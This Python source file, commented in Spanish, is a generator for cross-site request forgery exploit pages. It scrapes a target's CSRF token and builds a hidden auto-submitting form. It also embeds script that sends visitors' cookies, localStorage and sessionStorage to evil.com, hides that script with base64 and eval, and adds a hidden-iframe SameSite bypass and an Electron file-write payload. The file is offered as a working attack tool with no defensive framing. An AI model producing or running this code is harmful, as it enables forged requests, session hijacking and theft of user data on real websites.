import requests
from bs4 import BeautifulSoup
import logging
import base64
import os
from datetime import datetime

def extract_dynamic_token(url):
    try:
        res = requests.get(url)
        soup = BeautifulSoup(res.text, 'html.parser')
        token_input = soup.find('input', {'name': lambda x: x and 'csrf' in x.lower()})
        if token_input:
            return token_input.get('value')
    except Exception as e:
        logging.error(f"Error al extraer token CSRF: {e}")
    return None

def obfuscate_code(code):
    return base64.b64encode(code.encode()).decode()

def generate_exploit(target, params, method, bypass, aggressive):
    os.makedirs("exploits", exist_ok=True)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"exploits/exploit_{timestamp}.html"

    payload = f"""
    <html>
    <body>
        <form id='csrfForm' action='{target}' method='{method}'>
    """
    if params:
        for pair in params.split('&'):
            if '=' in pair:
                key, val = pair.split('=')
                payload += f"<input type='hidden' name='{key}' value='{val}'>\n"

    if bypass or aggressive:
        dynamic_token = extract_dynamic_token(target)
        if dynamic_token:
            payload += f"<input type='hidden' name='csrf_token' value='{dynamic_token}'>\n"
        else:
            payload += "<input type='hidden' name='csrf_token' value='bypass123'>\n"

    obfuscated = obfuscate_code("""
        function stealData() {
            var data = {
                url: window.location.href,
                cookies: document.cookie,
                localStorage: JSON.stringify(localStorage),
                sessionStorage: JSON.stringify(sessionStorage)
            };
            fetch('https://evil.com/steal_data', {
                method: 'POST',
                body: JSON.stringify(data),
                headers: { 'Content-Type': 'application/json' }
            });
        }
        stealData();
    """)

    extra_payloads = """
        // Bypass SameSite usando iframe oculto
        var iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.srcdoc = "<form action='{}' method='{}' id='f'>\
{{}}<\/form><script>document.getElementById('f').submit();<\/script>";
        document.body.appendChild(iframe);

        // Explotación en entornos Electron o integraciones híbridas
        if (window.require) {{
            const fs = require('fs');
            fs.writeFileSync('/tmp/hacked.txt', 'CSRF exploit ejecutado');
        }}
    """.format(target, method, ''.join(
        f"<input type='hidden' name='{k}' value='{v}'>" 
        for k, v in [pair.split('=') for pair in params.split('&')] if '=' in pair))

    payload += f"""
        </form>
        <script>
            document.getElementById('csrfForm').submit();
            fetch('https://evil.com/steal_cookies', {{
                method: 'POST',
                body: JSON.stringify({{ "cookies": document.cookie }}),
                headers: {{ 'Content-Type': 'application/json' }}
            }});
            var obfuscatedCode = atob('{obfuscated}');
            eval(obfuscatedCode);
            {extra_payloads}
        </script>
    </body>
    </html>
    """

    with open(filename, 'w') as f:
        f.write(payload)
    logging.info(f"Exploit generado en: {filename}")
    return filename
